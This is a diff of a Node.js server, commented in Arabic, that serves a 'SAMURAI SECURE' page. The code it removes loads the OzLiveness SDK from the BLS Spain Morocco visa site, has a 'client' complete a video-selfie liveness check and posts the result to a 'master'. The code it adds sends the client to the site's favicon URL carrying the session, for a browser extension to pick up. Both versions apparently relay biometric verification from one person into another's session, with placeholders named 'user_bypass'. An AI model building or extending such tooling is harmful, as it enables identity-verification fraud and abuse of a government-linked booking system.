@@ -4,23 +4,6 @@ const http = require('http');
 const PORT = process.env.PORT || 8080;
 const masters = {}; 
 
-function parse_silfi_session(sessionstring) {
-  try {
-    // تجربة فك التشفير القياسية
-    let decoded = sessionstring.replace(/b-/g, "=").split("").reverse().join("");
-    let b1 = Buffer.from(decoded, 'base64').toString('utf8');
-    let b2 = Buffer.from(b1, 'base64').toString('utf8');
-    let mapped = b2.split("").reverse().map(e => String.fromCharCode(e.charCodeAt(0) + 9)).join("");
-    return JSON.parse(mapped);
-  } catch (e) {
-    try {
-      return JSON.parse(Buffer.from(sessionstring, 'base64').toString('utf8'));
-    } catch(err) {
-      return null;
-    }
-  }
-}
-
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
@@ -28,20 +11,10 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
+    // 🔥 صفحة العميل الواجهة السوداء وتوجيهه لبيئة الإضافة الأصلية
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         const urlObj = new URL(req.url, 'https://silfi-production.up.railway.app');
         const sessionParam = urlObj.searchParams.get('session');
-        
-        let sessionData = sessionParam ? parse_silfi_session(sessionParam) : null;
-
-        // استخدام رابط SDK الرسمي المباشر للموقع لضمان عدم حدوث 404
-        const sdkUrl = sessionData && sessionData.plugin_liveness_url 
-            ? sessionData.plugin_liveness_url 
-            : "https://www.blsspainmorocco.net/Scripts/OzLiveness.js";
-
-        const userId = sessionData ? sessionData.user_id : "user_bypass";
-        const transId = sessionData ? sessionData.transaction_id : "trans_bypass";
-        const checkId = sessionData ? sessionData.check_id : "check_bypass";
 
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
@@ -62,91 +35,28 @@ const server = http.createServer((req, res) => {
             <body>
                 <div class="card">
                     <h1>SAMURAI SECURE</h1>
-                    <p id="status-text">[ INITIALIZING SECURE CAMERA ]</p>
-                    <div class="spinner" id="loader"></div>
+                    <p id="status-text">[ INITIALIZING SECURE CHANNEL ]</p>
+                    <div class="spinner"></div>
                 </div>
 
                 <script>
                     const SERVER_URL = "https://silfi-production.up.railway.app";
-                    const sessionId = "${sessionParam || ''}";
-                    const userId = "${userId}";
-                    const transId = "${transId}";
-                    const checkId = "${checkId}";
-                    const sdkUrl = "${sdkUrl}";
+                    const sessionParam = "${sessionParam || ''}";
 
-                    function updateStatus(text) {
-                        document.getElementById('status-text').innerText = text;
-                    }
-
-                    if (!sessionId) {
-                        updateStatus("ERROR: SESSION MISSING");
+                    if (!sessionParam) {
+                        document.getElementById('status-text').innerText = "ERROR: SESSION MISSING";
                     } else {
+                        // إعلام الماستر بأن العميل متصل
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
+                            body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionParam })
                         }).catch(e => {});
 
-                        const script = document.createElement('script');
-                        script.src = sdkUrl;
-                        script.onload = () => {
-                            updateStatus("SYSTEM READY - OPENING CAMERA");
-                            
-                            fetch(SERVER_URL, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ type: "CLIENT_STARTED_LIVENESS", session_id: sessionId })
-                            }).catch(e => {});
-
-                            setTimeout(() => {
-                                document.getElementById('loader').style.display = 'none';
-                                
-                                if (typeof window.OzLiveness !== 'undefined') {
-                                    window.OzLiveness.open({
-                                        lang: 'en',
-                                        meta: { user_id: userId, transaction_id: transId },
-                                        overlay_options: false,
-                                        action: ['video_selfie_blank'],
-                                        result_mode: 'safe',
-                                        on_complete: function(result) {
-                                            const uuid = result.event_session_id;
-                                            updateStatus("VERIFICATION SUCCESSFUL - SENDING DATA...");
-
-                                            const encodedPayload = btoa(JSON.stringify({ check_id: checkId, result: uuid }));
-                                            fetch(SERVER_URL, {
-                                                method: 'POST',
-                                                headers: { 'Content-Type': 'application/json' },
-                                                body: JSON.stringify({ session_id: sessionId, payload: encodedPayload })
-                                            })
-                                            .then(res => res.json())
-                                            .then(data => {
-                                                updateStatus("DONE ✔ - DATA SENT TO MASTER");
-                                            }).catch(err => {
-                                                updateStatus("ERROR SENDING UUID");
-                                            });
-                                        },
-                                        on_error: function(err) {
-                                            updateStatus("CAMERA ERROR: " + (err.message || "Permission Denied"));
-                                            fetch(SERVER_URL, {
-                                                method: 'POST',
-                                                headers: { 'Content-Type': 'application/json' },
-                                                body: JSON.stringify({ type: "CLIENT_ERROR", session_id: sessionId, reason: err.message })
-                                            }).catch(e => {});
-                                        }
-                                    });
-                                } else {
-                                    updateStatus("ERROR: SDK LOAD FAILED");
-                                }
-                            }, 1000);
-                        };
-                        script.onerror = () => {
-                            // محاولة تحميل بديلة في حال فشل الرابط الأول
-                            const backupScript = document.createElement('script');
-                            backupScript.src = "https://www.blsspainmorocco.net/Content/assets/plugins/ozliveness/OzLiveness.js";
-                            backupScript.onload = script.onload;
-                            document.head.appendChild(backupScript);
-                        };
-                        document.head.appendChild(script);
+                        // التوجيه الذكي لمسار الفافيكون الخاص بالموقع لتقوم إضافة العميل بالتقاطه وفك تشفيره
+                        setTimeout(() => {
+                            window.location.replace("https://www.blsspainmorocco.net/assets/images/favicon.png?session=" + encodeURIComponent(sessionParam));
+                        }, 1000);
                     }
                 </script>
             </body>
@@ -155,6 +65,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // استقبال البيانات من العميل وتوجيهها للماستر عبر الـ WebSocket
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => { body += chunk.toString(); });
